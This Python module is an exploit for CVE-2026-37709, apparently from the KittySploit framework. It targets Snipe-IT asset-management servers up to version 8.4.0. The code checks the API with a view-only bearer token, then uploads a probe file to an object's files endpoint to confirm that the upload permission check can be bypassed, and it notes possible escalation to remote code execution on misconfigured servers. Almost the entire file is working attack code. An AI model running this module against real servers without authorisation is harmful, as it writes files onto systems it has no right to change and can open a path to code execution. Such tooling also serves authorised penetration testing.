#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-37709 — Snipe-IT view-only unauthorized file upload."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Snipe-IT View-Only File Upload Bypass (CVE-2026-37709)",
        "description": (
            "CVE-2026-37709 in Snipe-IT ≤ 8.4.0 (fixed in 8.4.1): the file upload endpoint "
            "POST /api/v1/{object_type}/{id}/files checks the view permission gate instead of "
            "update. Any API user with view-only access can upload arbitrary files to any visible "
            "object. On misconfigured servers (PHP execution under /uploads/), this can escalate "
            "to RCE."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-37709"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-37709",
            "https://www.cve.org/CVERecord?id=CVE-2026-37709",
        ],
        "tags": [
            "snipe-it",
            "snipeit",
            "auth-bypass",
            "file-upload",
            "cve-2026-37709",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["snipe-it", "snipeit"],
                "endpoint_pattern_any": ["/api/v1/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "view-only file upload"},
                    {"capability": "file_upload", "from_detail": "unauthorized attachment"},
                ],
                "suggested_followups": [
                    "auxiliary/scanner/http/generic_upload_probe",
                ],
            },
        },
    }

    port = OptPort(80, "Snipe-IT HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    token = OptString(
        "",
        "API Bearer token for a view-only account (create at /users/<id>/api/tokens/create)",
        True,
    )
    object_type = OptChoice(
        "assets",
        "Snipe-IT object type to target",
        False,
        choices=[
            "assets",
            "licenses",
            "accessories",
            "consumables",
            "components",
            "locations",
            "users",
            "departments",
            "companies",
            "maintenances",
            "models",
            "suppliers",
        ],
    )
    object_id = OptInteger(1, "Numeric object ID to target", False)

    def check(self):
        token = (self.token or "").strip()
        if not token:
            return {
                "vulnerable": False,
                "reason": "token is required (view-only API Bearer token)",
                "confidence": "low",
            }

        base = (self.path or "/").rstrip("/")
        auth = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
        }
        hardware_path = f"{base}/api/v1/hardware" if base else "/api/v1/hardware"

        try:
            api_check = self.http_request(
                method="GET",
                path=hardware_path,
                params={"limit": 1},
                headers=auth,
                allow_redirects=False,
                timeout=int(self.timeout or 15),
            )
        except Exception as exc:
            return {
                "vulnerable": False,
                "reason": f"target unreachable: {exc.__class__.__name__}",
                "confidence": "low",
            }

        if not api_check:
            return {"vulnerable": False, "reason": "no HTTP response", "confidence": "low"}

        code = int(api_check.status_code or 0)
        if code == 302:
            return {
                "vulnerable": False,
                "reason": "redirect to login — app not ready or base URL incorrect",
                "confidence": "medium",
            }
        if code == 401:
            return {
                "vulnerable": False,
                "reason": "token rejected (HTTP 401) — invalid, expired, or wrong instance",
                "confidence": "high",
            }
        if code not in (200, 403):
            return {
                "vulnerable": False,
                "reason": f"unexpected HTTP {code} during API check",
                "confidence": "medium",
            }

        object_type = str(self.object_type or "assets")
        object_id = int(self.object_id or 1)
        upload_path = (
            f"{base}/api/v1/{object_type}/{object_id}/files"
            if base
            else f"/api/v1/{object_type}/{object_id}/files"
        )
        probe_name = "cve-2026-37709-probe.txt"
        probe_body = b"CVE-2026-37709-probe"

        try:
            upload = self.http_request(
                method="POST",
                path=upload_path,
                files={"file[]": (probe_name, probe_body, "text/plain")},
                headers=auth,
                allow_redirects=False,
                timeout=int(self.timeout or 15),
            )
        except Exception as exc:
            return {
                "vulnerable": False,
                "reason": f"upload request failed: {exc.__class__.__name__}",
                "confidence": "low",
            }

        if not upload:
            return {"vulnerable": False, "reason": "no upload response", "confidence": "low"}

        upload_code = int(upload.status_code or 0)
        if upload_code == 403:
            try:
                body, _ = parse_json_response(upload)
                msg = (body or {}).get("message") or (upload.text or "")[:200]
            except Exception:
                msg = (upload.text or "")[:200]
            return {
                "vulnerable": False,
                "reason": f"HTTP 403 — {msg} — target patched (v8.4.1+)",
                "confidence": "high",
            }
        if upload_code == 401:
            return {
                "vulnerable": False,
                "reason": "HTTP 401 — token rejected at upload step",
                "confidence": "high",
            }
        if upload_code == 404:
            return {
                "vulnerable": False,
                "reason": (
                    f"object {object_type}/{object_id} not found — "
                    "try a different object_id or object_type"
                ),
                "confidence": "high",
            }
        if upload_code != 200:
            return {
                "vulnerable": False,
                "reason": f"unexpected HTTP {upload_code} on upload",
                "confidence": "medium",
            }

        body, err = parse_json_response(upload)
        if err or not body:
            return {
                "vulnerable": False,
                "reason": "HTTP 200 but response is not valid JSON",
                "confidence": "medium",
            }
        if body.get("status") != "success":
            msg = body.get("messages") or body.get("message") or str(body)
            return {
                "vulnerable": False,
                "reason": f"HTTP 200 but unexpected payload: {str(msg)[:200]}",
                "confidence": "medium",
            }

        rows = (body.get("payload") or {}).get("rows") or []
        uploaded = rows[0] if rows else {}
        fname = uploaded.get("filename", probe_name)
        furl = uploaded.get("url", "")
        creator = (uploaded.get("created_by") or {}).get("name", "?")

        return {
            "vulnerable": True,
            "reason": (
                f"View-only user '{creator}' uploaded '{fname}' to "
                f"{object_type}/{object_id} — authorization bypass confirmed"
            ),
            "confidence": "high",
            "filename": fname,
            "file_url": furl,
            "creator": creator,
            "upload_path": upload_path,
            "response": body,
        }

    def run(self):
        try:
            print_status("CVE-2026-37709 — Snipe-IT view-only file upload bypass")

            result = self.check()
            if not result.get("vulnerable"):
                print_error(result.get("reason", "Target does not appear vulnerable"))
                return False

            print_success(result.get("reason", "Target appears vulnerable"))
            if result.get("filename"):
                print_info(f"Uploaded file: {result['filename']}")
            if result.get("creator"):
                print_info(f"Created by: {result['creator']}")
            if result.get("file_url"):
                print_info(f"File URL: {result['file_url']}")
            print_info(
                "Misconfigured /uploads/ PHP execution may allow further RCE — "
                "audit server hardening separately"
            )
            return True

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
